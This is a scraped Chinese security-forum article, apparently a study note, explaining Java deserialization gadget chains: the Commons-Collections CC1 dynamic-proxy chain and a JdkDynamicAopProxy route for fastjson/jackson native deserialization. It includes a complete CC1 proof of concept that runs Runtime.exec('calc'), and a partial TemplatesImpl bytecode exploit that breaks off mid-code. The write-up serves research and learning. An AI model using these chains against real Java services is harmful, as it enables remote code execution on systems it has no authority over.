---
title: fastjson 原生反序列化配合动态代理绕过限制
url: https://forum.butian.net/share/4153
source: 奇安信攻防社区
date: 2025-02-20
fetch_date: 2025-10-06T20:32:41.287031
---

# fastjson 原生反序列化配合动态代理绕过限制

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### fastjson 原生反序列化配合动态代理绕过限制

对于动态代理，只记得 cc1 接触过一次，然后就没有怎么碰到过了，而且动态代理似乎利用面还是比较广的，许多关键时刻都会使用到，这里正好来重新学习学习，还记得入门 java 的时候动态代理就学了半天，感觉确实很抽象

fastjson 原生反序列化配合动态代理绕过限制
=========================
前言
--
对于动态代理，只记得 cc1 接触过一次，然后就没有怎么碰到过了，而且动态代理似乎利用面还是比较广的，许多关键时刻都会使用到，这里正好来重新学习学习，还记得入门 java 的时候动态代理就学了半天，感觉确实很抽象
cc1 动态代理初识
----------
首先是我们的调用链
```php
AnnotationInvocationHan.readobject--proxy.entryset--AnnotationInvocationHan.invoke--LazyMap.get--chainedTransformer.transformer....
```
\*\*POC\*\*
```php
package cc1;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
public class CC1lazy {
public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
//定义一系列Transformer对象,组成一个变换链
Transformer[] transformers = new Transformer[]{
//返回Runtime.class
new ConstantTransformer(Runtime.class),
//通过反射调用getRuntime()方法获取Runtime对象
new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
//通过反射调用invoke()方法
new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//通过反射调用exec()方法启动notepad
new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
//将多个Transformer对象组合成一个链
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap hash = new HashMap&lt;&gt;();
//使用chainedTransformer装饰HashMap生成新的Map
Map decorate = LazyMap.decorate(hash, chainedTransformer);
//通过反射获取AnnotationInvocationHandler类的构造方法
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
//设置构造方法为可访问的
constructor.setAccessible(true);
//通过反射创建 Override 类的代理对象 instance,并设置其调用会委托给 decorate 对象
InvocationHandler instance = (InvocationHandler) constructor.newInstance(Override.class, decorate);
//因为AnnotationInvocationHandler是继承了代理接口的，所以可以直接使用它的构造器去构造一个代理的处理器，但是需要强转
//创建Map接口的代理对象proxyInstance,并设置其调用处理器为instance
Map proxyInstance = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, instance);
//再次通过反射创建代理对象
Object o = constructor.newInstance(Override.class, proxyInstance);
serialize(o);
unserialize("1.bin");
}
public static void serialize(Object obj) throws IOException {
ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(Paths.get("1.bin")));
out.writeObject(obj);
}
public static void unserialize(String filename) throws IOException, ClassNotFoundException {
ObjectInputStream out = new ObjectInputStream(Files.newInputStream(Paths.get(filename)));
out.readObject();
}
}
```
这里我们只对动态代理的部分做分析
这里本来的目的是寻找一个能够嫁接调用 get 的地方
找到了 AnnotationInvocationHandler 的 invoke 方法
```php
public Object invoke(Object var1, Method var2, Object[] var3) {
String var4 = var2.getName();
Class[] var5 = var2.getParameterTypes();
if (var4.equals("equals") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
return this.equalsImpl(var3[0]);
} else if (var5.length != 0) {
throw new AssertionError("Too many parameters for an annotation method");
} else {
switch (var4) {
case "toString":
return this.toStringImpl();
case "hashCode":
return this.hashCodeImpl();
case "annotationType":
return this.type;
default:
Object var6 = this.memberValues.get(var4);
if (var6 == null) {
throw new IncompleteAnnotationException(this.type, var4);
} else if (var6 instanceof ExceptionProxy) {
throw ((ExceptionProxy)var6).generateException();
} else {
if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) {
var6 = this.cloneArray(var6);
}
return var6;
}
}
}
}
```
只需要它的 memberValues 可以控制就 ok
所以就回到了如何触发 invoke 的问题上来了
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/02/attach-3a2346294dfa6dad08c222c02bd3de66bca01cde.png)
可以看到他 implements 了InvocationHandler 这个接口，说明这个类也可以动态代理
因为实现了这个接口必须重写一个 invoke 方法，而且方法会在代理对象的方法被调用时执行，所以我们如果创建一个动态代理，而且把它作为代理的处理器，那么就可以成功的触发 invoke 方法
我们知道因为动态代理的缘故，只要有代理对象的方法被触发，他也会触发。
具体的 cc1 的细节我们就不看了，关键就是如何出的 invoke 方法
接下来是怎么创建一个代理，来把这个类作为代理对象？我们只要使用 Proxy 创建一个代理实例，将我们构造的 AnnotationInvocationHandler 对象作为调用处理器传入。代理什么？
由于 AnnotationInvocationHandler.readObject() 是反序列化的入口，我们需要通过 AnnotationInvocationHandler 来包装由 Proxy 创建的代理对象，并将其重新序列化。
在反序列化时，memberValues 的 entrySet() 方法会被调用，而我们希望 memberValues 内部存储的代理对象能够触发 invoke() 方法，从而进入我们构造的链条。
因为 memberValues 是一个 Map 类型，所以我们需要通过 Proxy 创建一个 Map 类型的代理对象。
简单的调试看看调用栈
```php
invoke:57, AnnotationInvocationHandler (sun.reflect.annotation)
entrySet:-1, $Proxy1 (com.sun.proxy)
readObject:444, AnnotationInvocationHandler (sun.reflect.annotation)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:1900, ObjectInputStream (java.io)
readOrdinaryObject:1801, ObjectInputStream (java.io)
readObject0:1351, ObjectInputStream (java.io)
readObject:371, ObjectInputStream (java.io)
unserialize:67, CC1lazy (cc1)
main:57, CC1lazy (cc1)
```
这里因为调用了 public abstract java.util.Set java.util.Map.entrySet()触发了动态代理
调用代理的 invoke 方法，从而接起了后面的链子
JdkDynamicAopProxy 代理绕过
-----------------------
当然上面的代理虽然是我们链子中的常客，但是限制还是很大的，因为在高版本的 jdk 改了
这里我们看看这个动态代理类
首先如何寻找这种代理呢
其实很简单，只需要实现我们的接口，我们找接口的实现类
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/02/attach-d7f3a422275e0ecde616eaee2af9bf8067d9b84f.png)
但是限制就是需要我们存在依赖
网上找了一下，发现以前见过，网上公开的利用就是在 jackson 原生反序列化的时候
参考https://xz.aliyun.com/t/12846?time\\_\\_1311=GqGxuDcDRGexlxx2DU27oDkmD8SGCmzmeD
是为了解决 jackson 原生不稳定的痛点
正常的调用链
```php
package org.jackson;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.\*;
import java.lang.reflect.Field;
import java.util.Base64;
public class EXP {
public static void main(String[] args) throws Exception {
ClassPool pool = ClassPool.getDefault();
CtClass ctClass = pool.makeClass("a");
CtClass superClass = pool.get(AbstractTranslet.class.getName());
ctClass.setSuperclass(superClass);
CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
ctClass.addConstructor(constructor);
byte[] bytes = ctClass.toBytecode();
Templates templatesImpl = new TemplatesImpl();
setFieldValue(templatesImpl, "\_bytecodes", new byte[][]{bytes});
setFieldValue(templates...